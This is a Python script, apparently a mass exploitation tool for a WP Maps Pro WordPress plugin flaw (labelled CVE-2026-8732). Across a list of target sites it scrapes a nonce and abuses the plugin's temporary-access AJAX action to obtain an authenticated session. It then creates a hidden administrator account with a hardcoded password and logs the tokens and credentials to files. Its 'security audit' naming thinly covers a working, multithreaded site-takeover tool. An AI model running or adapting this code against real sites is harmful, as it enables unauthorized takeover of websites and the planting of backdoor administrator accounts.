# -*- coding: utf-8 -*-
import sys
import re
import threading
import json
import time
from queue import Queue
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 10
TOTAL_THREAD = 10
OUTPUT_FILE = "res.txt"
ADMIN_FILE = "admin_created.txt"

BASE_USERNAME = "securityaudit"
NEW_PASSWORD = "StrongP@ssw0rd123!"
NEW_EMAIL = "audit@example.com"

print_lock = threading.Lock()
file_lock = threading.Lock()

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

def get_nonce(url):
    """Extract nonce from various WordPress patterns"""
    try:
        session = requests.Session()
        session.headers.update(HEADERS)
        resp = session.get(url, timeout=TIMEOUT, verify=False)
        html = resp.text
        
        # Pattern 1: wpgmp_local object with nonce
        patterns = [
            r'wpgmp_local\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
            r'wpgmp_local\s*=\s*\{[^}]*\'nonce\'\s*:\s*\'([^\']+)\'',
            r'var\s+wpgmp_local\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
            r'"nonce"\s*:\s*"([a-f0-9]+)"',
            r"'nonce'\s*:\s*'([a-f0-9]+)'",
            r'fc-call-nonce["\']?\s*:\s*["\']([^"\']+)',
            r'ajax_nonce["\']?\s*:\s*["\']([^"\']+)',
            r'security["\']?\s*:\s*["\']([^"\']+)',
            r'nonce["\']?\s*:\s*["\']([^"\']+)',
            r'name=["\']_wpnonce["\']\s+value=["\']([^"\']+)',
            r'id=["\']_wpnonce["\']\s+value=["\']([^"\']+)',
            r'<input[^>]+name=["\']_wpnonce["\'][^>]+value=["\']([^"\']+)',
            r'<input[^>]+value=["\']([^"\']+)"[^>]+name=["\']_wpnonce["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
            if match:
                nonce = match.group(1)
                # Validate nonce format (typically alphanumeric, 8-32 chars)
                if re.match(r'^[a-zA-Z0-9]{8,}$', nonce):
                    return nonce
                # Also accept hex format
                if re.match(r'^[a-f0-9]{10,}$', nonce, re.IGNORECASE):
                    return nonce
        
        # Pattern 2: Try to find in JavaScript variables
        js_patterns = [
            r'nonce\s*=\s*["\']([^"\']+)["\']',
            r'ajaxurl[^;]+nonce[^=]+=\s*["\']([^"\']+)["\']',
            r'wpApiSettings\.nonce\s*=\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in js_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                nonce = match.group(1)
                if re.match(r'^[a-zA-Z0-9]{8,}$', nonce):
                    return nonce
        
        # Pattern 3: Try to find in inline scripts
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL | re.IGNORECASE)
        for script in scripts:
            match = re.search(r'nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', script)
            if match:
                nonce = match.group(1)
                if re.match(r'^[a-zA-Z0-9]{8,}$', nonce):
                    return nonce
        
        return None
    except Exception:
        return None

def try_exploit_with_nonce(url, nonce):
    """Attempt exploitation with the given nonce"""
    ajax_url = url + "/wp-admin/admin-ajax.php"
    payload = {
        'action': 'wpgmp_temp_access_ajax',
        'nonce': nonce,
        'handler': 'wpgmp_temp_access_support',
        'check_temp': 'false'
    }

    post_headers = HEADERS.copy()
    post_headers.update({
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': url,
        'Referer': url + '/',
        'X-Requested-With': 'XMLHttpRequest'
    })

    try:
        session = requests.Session()
        session.headers.update(post_headers)
        resp = session.post(ajax_url, data=payload, timeout=TIMEOUT, verify=False)
        response_text = resp.text
        token, redirect_url = extract_token_and_url(response_text)
        
        return token, redirect_url, session, response_text
    except Exception as e:
        return None, None, None, str(e)

def simpan_hasil(url, token, redirect_url=None):
    with file_lock:
        try:
            with open(OUTPUT_FILE, 'a') as f:
                f.write("domain : %s\n" % url)
                f.write("token full : %s\n" % token)
                if redirect_url:
                    f.write("redirect url : %s\n" % redirect_url)
                f.write("\n")
        except IOError as e:
            with print_lock:
                print(f"[-] Failed to write to output file: {str(e)}")

def simpan_admin(url, username, password, email):
    with file_lock:
        try:
            with open(ADMIN_FILE, 'a') as f:
                f.write("=== Admin Created ===\n")
                f.write("Domain: %s/wp-admin/\n" % url)
                f.write("Username: %s\n" % username)
                f.write("Password: %s\n" % password)
                f.write("Email: %s\n" % email)
                f.write("-------------------------------\n\n")
        except IOError as e:
            with print_lock:
                print(f"[-] Failed to save admin info: {str(e)}")

def extract_token_and_url(response_text):
    """Extract token and URL from response with improved patterns"""
    try:
        data = json.loads(response_text)
        if 'url' in data:
            full_url = data['url']
            # Try multiple token parameter names
            token_patterns = [r'[?&]wpmp_token=([^&]+)', r'[?&]token=([^&]+)', 
                            r'[?&]access_token=([^&]+)', r'[?&]auth_token=([^&]+)']
            for pattern in token_patterns:
                match = re.search(pattern, full_url)
                if match:
                    return match.group(1), full_url
        if 'token' in data:
            return data['token'], data.get('url', None)
        if 'access_token' in data:
            return data['access_token'], data.get('url', None)
        if 'redirect_url' in data:
            return data.get('token', None), data['redirect_url']
    except:
        pass
    
    # Pattern matching for token in response
    token_patterns = [
        r'wpmp_token=([a-f0-9]+)',
        r'token["\']?\s*:\s*["\']([^"\']+)',
        r'access_token["\']?\s*:\s*["\']([^"\']+)',
        r'["\']token["\']\s*:\s*["\']([^"\']+)',
        r'["\']access_token["\']\s*:\s*["\']([^"\']+)',
        r'authorization["\']?\s*:\s*["\']Bearer\s+([^"\']+)',
        r'Bearer\s+([a-zA-Z0-9\-_]+)',
    ]
    
    for pattern in token_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            token = match.group(1)
            # Extract URL if present
            url_match = re.search(r'(https?://[^\s"\']+wp-admin[^\s"\']*)', response_text)
            if url_match:
                return token, url_match.group(1)
            return token, None
    
    # Check if entire response is a token
    if re.match(r'^[a-f0-9]{16,64}$', response_text.strip(), re.IGNORECASE):
        return response_text.strip(), None
    
    return None, None

def create_admin_user(session, base_url, username, password, email):
    """Create admin user with improved nonce extraction"""
    try:
        admin_url = base_url.rstrip('/') + '/wp-admin/user-new.php'
        headers = HEADERS.copy()
        headers['Referer'] = base_url + '/wp-admin/'
        resp = session.get(admin_url, headers=headers, timeout=TIMEOUT, verify=False)
        if resp.status_code != 200:
            return False, f"Cannot access user-new.php (status {resp.status_code})"

        html = resp.text
        
        # Multiple patterns for nonce extraction
        nonce_patterns = [
            r'name="_wpnonce_create-user"\s+value="([^"]+)"',
            r'id="_wpnonce_create-user"[^>]+value="([^"]+)"',
            r'_wpnonce_create-user["\']?\s*value=["\']([^"\']+)',
            r'name="_wpnonce_create-user"[^>]*value=["\']([^"\']+)',
        ]
        
        create_nonce = None
        for pattern in nonce_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                create_nonce = match.group(1)
                break
        
        if not create_nonce:
            # Try to find any wpnonce
            alt_pattern = r'name=["\']_wpnonce["\']\s+value=["\']([^"\']+)'
            match = re.search(alt_pattern, html)
            if match:
                create_nonce = match.group(1)
            else:
                return False, "Cannot find create-user nonce"

        # Get submit button value
        submit_match = re.search(r'<input[^>]*type="submit"[^>]*name="createuser"[^>]*value="([^"]+)"', html)
        submit_value = "Add New User"
        if submit_match:
            submit_value = submit_match.group(1)

        data = {
            'action': 'createuser',
            '_wpnonce_create-user': create_nonce,
            '_wp_http_referer': '/wp-admin/user-new.php',
            'user_login': username,
            'email': email,
            'first_name': '',
            'last_name': '',
            'url': '',
            'pass1': password,
            'pass2': password,
            'role': 'administrator',
            'createuser': submit_value
        }

        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_resp = session.post(admin_url, data=data, headers=post_headers, 
                                timeout=TIMEOUT, verify=False, allow_redirects=False)

        if post_resp.status_code == 302:
            location = post_resp.headers.get('Location', '')
            if 'users.php' in location or 'user-new.php' in location:
                return True, "Admin created successfully"

        # Verify admin creation
        check_url = base_url + '/wp-admin/users.php'
        check_resp = session.get(check_url, timeout=TIMEOUT, verify=False)
        if check_resp.status_code == 200:
            if username in check_resp.text:
                return True, "Admin created and verified"
            # Try to login with new credentials
            login_url = base_url + '/wp-login.php'
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': base_url + '/wp-admin/',
                'testcookie': '1'
            }
            login_resp = session.post(login_url, data=login_data, timeout=TIMEOUT, verify=False)
            if base_url + '/wp-admin/' in login_resp.url:
                return True, "Admin created and login successful"

        return False, "Admin creation failed verification"
    except Exception as e:
        return False, f"Exception: {str(e)}"

def check_vulnerability(url):
    url = url.strip()
    if not url:
        return
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    url = url.rstrip('/')

    with print_lock:
        print(f"[*] Checking: {url}")

    # Try to get nonce with multiple attempts
    nonce = None
    for attempt in range(3):  # 3 attempts
        nonce = get_nonce(url)
        if nonce:
            break
        time.sleep(1)
    
    if not nonce:
        with print_lock:
            print(f"[-] {url} -> Failed to get nonce, skipping...")
        return

    with print_lock:
        print(f"[*] {url} -> Nonce obtained: {nonce[:8]}... (attempting exploitation)")

    # Attempt exploitation directly with the extracted nonce
    token, redirect_url, session, response = try_exploit_with_nonce(url, nonce)

    if token:
        with print_lock:
            print(f"[VULNERABLE] {url} -> Token obtained successfully")
        simpan_hasil(url, token, redirect_url)

        if redirect_url:
            with print_lock:
                print(f"[*] {url} -> Accessing redirect URL...")
            try:
                session.get(redirect_url, timeout=TIMEOUT, verify=False)
            except:
                pass

        # Attempt to create admin user
        unique_username = f"{BASE_USERNAME}_{int(time.time())}"
        success, message = create_admin_user(session, url, unique_username, NEW_PASSWORD, NEW_EMAIL)
        if success:
            with print_lock:
                print(f"[+] {url} -> Admin created: {unique_username} / {NEW_PASSWORD}")
            simpan_admin(url, unique_username, NEW_PASSWORD, NEW_EMAIL)
        else:
            with print_lock:
                print(f"[-] {url} -> Failed to create admin: {message}")
    else:
        # Check response for clues even if no token found
        if response and response != "None":
            with print_lock:
                print(f"[-] {url} -> No token extracted, but received response (length: {len(str(response))})")
                # Don't fail, just continue
        else:
            with print_lock:
                print(f"[-] {url} -> Not vulnerable or nonce invalid")

def worker(q):
    while not q.empty():
        target = q.get()
        try:
            check_vulnerability(target)
        except Exception as e:
            with print_lock:
                print(f"[-] Worker error for {target}: {str(e)}")
        finally:
            q.task_done()

def main():
    banner = """
    ============================================
     WP Maps Pro Vulnerability Scanner & Auto Admin
             CVE-2026-8732
    ===========================================
    """
    print(banner)

    if len(sys.argv) < 2:
        print("Usage: python mass_audit.py [target_list.txt]")
        sys.exit(1)

    target_file = sys.argv[1]
    try:
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except IOError:
        print(f"[-] File {target_file} not found!")
        sys.exit(1)

    print(f"[*] Starting scan on {len(targets)} targets using {TOTAL_THREAD} threads...")
    print(f"[*] Valid results saved to: {OUTPUT_FILE}")
    print(f"[*] Admin credentials saved to: {ADMIN_FILE}")
    print(f"[*] New admin username: {BASE_USERNAME}_<timestamp>, password: {NEW_PASSWORD}\n")

    q = Queue()
    for target in targets:
        q.put(target)

    threads = []
    for i in range(TOTAL_THREAD):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()
    print(f"\n[*] Scan finished. Check {OUTPUT_FILE} and {ADMIN_FILE}")

if __name__ == "__main__":
    main()
